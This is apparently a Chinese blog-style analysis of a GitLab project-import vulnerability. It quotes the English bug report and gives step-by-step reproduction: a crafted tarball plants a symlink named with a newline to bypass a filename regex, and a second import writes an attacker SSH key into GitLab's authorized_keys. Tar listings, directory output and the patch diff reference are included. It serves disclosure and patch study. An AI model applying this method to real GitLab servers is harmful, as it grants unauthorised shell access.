#### 介绍
最近GitLab官方发布的几个安全公告，包含一个Projects Import处的RCE漏洞。

A filename regular expression could be bypassed and enable the attacker to create a symbolic link in Gitlab upload directory by importing a specially crafted Gitlab export. Further more, Gitlab is designed to not delete project upload directory currently. So, the attacker could delete the imported project and then upload another specially crafted Gitlab export to a project with the same name, which leads to path traversal/arbitrary file upload and finally enables the attacker to be able to get a shell with the permission of the system gitlab user.

受影响版本及详细可参考官方的issue：
> [Vulnerability in project import leads to arbitrary command execution (#49133) · Issues · GitLab.org / GitLab Community Edition · GitLab](https://gitlab.com/gitlab-org/gitlab-ce/issues/49133)

#### 漏洞分析
A filename regular expression could be bypassed and enable the attacker to create a symbolic link in Gitlab upload directory by importing a specially crafted Gitlab export. Further more, Gitlab is designed to not delete project upload directory currently. So, the attacker could delete the imported project and then upload another specially crafted Gitlab export to a project with the same name, which leads to path traversal/arbitrary file upload and finally enables the attacker to be able to get a shell with the permission of the system gitlab user.
Description:


* 1、how to create a symbolic link in the upload directory
code in file_importer.rb uses %r{.*/\.{1,2}$} to except . and .. in the extracted project import directory tree, and check everything else that does not match this regex and delete all symlinks. However, we can easily construct a symlink with the name .\nevil in the tarball that matches this regex perfectly. Therefore, it will not be removed by function remove_symlinks! in the same file, and finally uploaded to /var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\nevil -> /var/opt/gitlab (assume we import the project to nyangawa/myrepo and the symlink points to /var/opt/gitlab)


* 2、how to use the uploaded symbolic link to get shell access
First delete the nyangawa/myrepo project we just created. For some reasons the upload directory of this project does not get purged. Then we import another tarball which has, for example, uploads/.\neviil/.ssh/authorized_keys in it. And the content of this file is my ssh public key. Then import this tarball to create project nyangawa/myrepo again.


* 3、after all
the uploaded authorized_keys is copied to /var/opt/gitlab/gitlab-rails/uploads/nyangawa/myrepo/.\nevil/.ssh/authorized_keys of the victim's filesystem but unfortunately, this path redirects to /var/opt/gitlab/.ssh/authorized_keys. Then I can login to the victim server by ssh with Gitlab's system username.


For step 2 and 3, there're some other approaches to get command executed since we can already upload any file to the victim's file system controlled by Gitlab.


* Impact

  * An attacker can upload arbitrary file to the victim's file system
  * Data of other users could be override
  * An attacker can get a system shell by overwrite specific files.

To reproduce the issue with these tarballs.

* 1、create project evil_project by importing tarball1.tar.gz


root@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/
total 8.0K
drwx------  2 git git 4.0K Jul 11 00:34 .
lrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -> /var/opt/gitlab
drwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..
here you can see a symbolic link is created.

* 2、remove the project evil_project, while the upload directory of this project remains unpurged.
```
root@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/
total 8.0K
drwx------  2 git git 4.0K Jul 11 00:34 .
lrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -> /var/opt/gitlab
drwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..
```
* 3、importing tarball2.tar.gz to the same project evil_project, it's ok since the project was deleted in step 2

Check the authorized_keys of Gitlab
```
root@10:/var/opt/gitlab/.ssh# cat authorized_keys
```
* POC
ssh-rsa a_key_of_mine nyangawa
For the content of these tarballs
tarball1.tar.gz
```
$ tar tvf tarball1.tar.gz 
-rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION
-rw-r--r-- asakawa/asakawa 1754 2018-07-11 08:30 project.json
drwxr-xr-x asakawa/asakawa    0 2018-07-11 08:32 uploads/
lrwxrwxrwx asakawa/asakawa    0 2018-07-11 08:32 uploads/.\nevil -> /var/opt/gitlab
```
tarball2.tar.gz
```
$ tar tvf tarball2.tar.gz 
-rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION
-rw-r--r-- asakawa/asakawa 1754 2018-07-11 08:30 project.json
drwxr-xr-x asakawa/asakawa    0 2018-07-11 08:36 uploads/
drwxr-xr-x asakawa/asakawa    0 2018-07-11 08:36 uploads/.\nevil/
drwxr-xr-x asakawa/asakawa    0 2018-07-11 08:37 uploads/.\nevil/.ssh/
-rw-r--r-- asakawa/asakawa   51 2018-07-11 08:38 uploads/.\nevil/.ssh/authorized_keys
```

#### 补丁对比
可以看到将匹配的正则由%r{.*/\.{1,2}$}修改为了%w(. ..)，详细见修复代码
[lib/gitlab/import_export/file_importer.rb · v10.8.4 · GitLab.org / GitLab Community Edition · GitLab](https://gitlab.com/gitlab-org/gitlab-ce/blob/v10.8.4/lib/gitlab/import_export/file_importer.rb)
[lib/gitlab/import_export/file_importer.rb · v10.8.6 · GitLab.org / GitLab Community Edition · GitLab](https://gitlab.com/gitlab-org/gitlab-ce/blob/v10.8.6/lib/gitlab/import_export/file_importer.rb)
#### 参考
[Vulnerability in project import leads to arbitrary command execution (#49133) · Issues · GitLab.org / GitLab Community Edition · GitLab](https://gitlab.com/gitlab-org/gitlab-ce/issues/49133)
